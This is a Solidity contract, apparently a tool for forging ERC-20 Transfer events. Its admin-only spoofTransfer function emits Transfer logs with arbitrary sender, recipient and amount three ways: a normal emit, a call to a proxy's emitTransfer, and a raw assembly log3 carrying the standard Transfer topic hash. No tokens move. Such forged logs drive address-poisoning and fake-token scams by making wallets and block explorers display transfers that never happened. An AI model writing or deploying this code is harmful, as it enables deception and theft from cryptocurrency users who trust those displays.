// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITokenProxy {
    function emitTransfer(address from, address to, uint256 value) external;
}

contract EventSpoofer {
    address public immutable proxy;
    address public admin;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address _proxy) {
        proxy = _proxy;
        admin = msg.sender;
    }

    function spoofTransfer(address from, address to, uint256 value) external {
        require(msg.sender == admin, "Unauthorized");
        emit Transfer(from, to, value);
        ITokenProxy(proxy).emitTransfer(from, to, value);
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, value)
            log3(ptr, 0x20, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, from, to)
        }
    }

    function setAdmin(address newAdmin) external {
        require(msg.sender == admin, "Unauthorized");
        admin = newAdmin;
    }
}